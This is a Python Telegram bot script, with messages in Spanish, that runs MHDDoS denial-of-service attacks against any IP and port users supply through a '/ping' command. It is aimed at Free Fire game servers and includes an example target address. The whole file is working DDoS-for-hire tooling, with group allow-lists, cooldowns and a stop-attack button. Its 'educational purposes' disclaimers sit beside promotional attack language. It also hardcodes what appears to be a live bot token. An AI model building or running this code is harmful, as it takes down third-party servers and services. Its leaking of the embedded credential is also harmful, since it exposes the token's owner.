import telebot
import subprocess
import json
import os
import time
from threading import Lock
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = "7692852873:AAHQ3YtPu90LarVnzyPRd4695zPDKY8taOQ"
ADMIN_ID = 6348583777
GROUP_LINK = "https://t.me/zFerCrashGoup"  # Reemplaza con el enlace de tu grupo
START_PY_PATH = "/workspaces/MHDDoS/start.py"

bot = telebot.TeleBot(BOT_TOKEN)
db_lock = Lock()
cooldowns = {}
active_attacks = {}

# Ruta del archivo JSON
groups_file = "groups.json"

# Verifica si el archivo de grupos existe, si no, lo crea
if not os.path.exists(groups_file):
    with open(groups_file, "w") as f:
        json.dump({"groups": []}, f)

def load_groups():
    """Carga los grupos desde el archivo JSON"""
    with open(groups_file, "r") as f:
        data = json.load(f)
    return data["groups"]

def save_groups(groups):
    """Guarda los grupos en el archivo JSON"""
    with open(groups_file, "w") as f:
        json.dump({"groups": groups}, f)

def is_allowed(message):
    """Verifica si el mensaje proviene de un grupo autorizado o si es del admin en privado."""
    groups = load_groups()
    if message.chat.id in groups or (message.chat.type == "private" and message.from_user.id == ADMIN_ID):
        return True
    bot.reply_to(message, f"❌ *¡Este bot solo funciona en los grupos autorizados!*\n🔗 Únete a nuestro grupo de *Free Fire* aquí: {GROUP_LINK}")
    return False

@bot.message_handler(commands=["start"])
def handle_start(message):
    if not is_allowed(message):
        return

    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton(
        text="💻 *SOPORTE - OFICIAL* 💻",
        url=f"tg://user?id={ADMIN_ID}"
    )
    markup.add(button)

    bot.send_message(
        message.chat.id,
        (
            "🎮 *¡Bienvenido al Bot de Ping MHDDoS para Free Fire!*\n\n"
            "🚀 *Prepárate para dominar el campo de batalla* con nuestras poderosas herramientas de DDoS.\n\n"
            "📌 *Cómo usarlo:*\n"
            "```/ping <TIPO> <IP/HOST:PUERTO> <HILOS> <MS>```\n\n"
            "💡 *Ejemplo de uso:*\n"
            "```/ping UDP 143.92.125.230:10013 3 120```\n\n"
            "⚠️ *Aviso Importante:* Este bot fue creado para *finalidades educativas*, ¡usa con responsabilidad!"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )

@bot.message_handler(commands=["ping"])
def handle_ping(message):
    if not is_allowed(message):
        return

    telegram_id = message.from_user.id

    # Verificar cooldown
    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 20:
        bot.reply_to(message, "❌ *Espera 20 segundos* antes de intentar de nuevo.")
        return

    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            (
                "❌ *Formato inválido!* 🚫\n\n"
                "📌 *Uso correcto:*\n"
                "`/ping <TIPO> <IP/HOST:PUERTO> <HILOS> <MS>`\n\n"
                "💡 *Ejemplo de uso:*\n"
                "`/ping UDP 143.92.125.230:10013 3 120`"
            ),
            parse_mode="Markdown",
        )
        return

    attack_type = args[1]
    ip_port = args[2]
    threads = args[3]
    duration = args[4]
    command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]

    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_attacks[telegram_id] = process
        cooldowns[telegram_id] = time.time()

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⛔ *Parar Ataque* ⛔", callback_data=f"stop_{telegram_id}"))

        bot.reply_to(
            message,
            (
                "*🔥 ¡Ataque Iniciado! 🔥*\n\n"
                f"📍 *IP:* {ip_port}\n"
                f"⚙️ *Tipo:* {attack_type}\n"
                f"🧵 *Hilos:* {threads}\n"
                f"⏳ *Duración:* {duration}ms\n\n"
                "*Este bot fue creado por @xFernandoh* 🎮"
            ),
            reply_markup=markup,
            parse_mode="Markdown",
        )
    except Exception as e:
        bot.reply_to(message, f"❌ *Error al iniciar el ataque:* {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        bot.answer_callback_query(
            call.id, "❌ *Solo el usuario que inició el ataque puede pararlo.*"
        )
        return

    if telegram_id in active_attacks:
        process = active_attacks[telegram_id]
        process.terminate()
        del active_attacks[telegram_id]

        bot.answer_callback_query(call.id, "✅ *Ataque detenido con éxito.*")
        bot.edit_message_text(
            "*[⛔] *ATAQUE PARADO* [⛔]*",
            chat_id=call.message.chat.id,
            message_id=call.message.id,
            parse_mode="Markdown",
        )
        time.sleep(3)
        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
    else:
        bot.answer_callback_query(call.id, "❌ *No hay ataque activo para detener.*")

@bot.message_handler(commands=["addgroup"])
def handle_addgroup(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Solo el admin puede agregar grupos.*")
        return

    try:
        # Obtener ID del grupo
        group_id = int(message.text.split()[1])
        groups = load_groups()

        # Verificar si el grupo ya está en la lista
        if group_id in groups:
            bot.reply_to(message, "❌ *Este grupo ya está en la lista.*")
            return

        # Agregar el grupo y guardar
        groups.append(group_id)
        save_groups(groups)

        bot.reply_to(message, f"✅ *Grupo {group_id} agregado correctamente.*")
    except IndexError:
        bot.reply_to(message, "❌ *Por favor, proporciona un ID de grupo válido.*")
    except ValueError:
        bot.reply_to(message, "❌ *El ID de grupo debe ser un número válido.*")

@bot.message_handler(commands=["help"])
def handle_help(message):
    if not is_allowed(message):
        return

    bot.send_message(
        message.chat.id,
        (
            "🔧 *¿Cómo usar este bot?* 🤖\n\n"
            "*Comandos disponibles:*\n"
            "1. `/start`: Inicia el bot y te da una breve introducción.\n"
            "2. `/ping <TIPO> <IP/HOST:PUERTO> <HILOS> <MS>`: Inicia un ataque de ping.\n"
            "3. `/addgroup <ID del grupo>`: Agrega un grupo a la lista de grupos permitidos (solo admin).\n"
            "4. `/help`: Muestra esta ayuda.\n\n"
            "⚠️ *Recuerda:* Este bot es para *finalidades educativas* y *no* debe ser usado con fines maliciosos.\n"
            "¡Juega con responsabilidad y diviértete! 🎮"
        ),
        parse_mode="Markdown",
    )

if __name__ == "__main__":
    bot.infinity_polling()
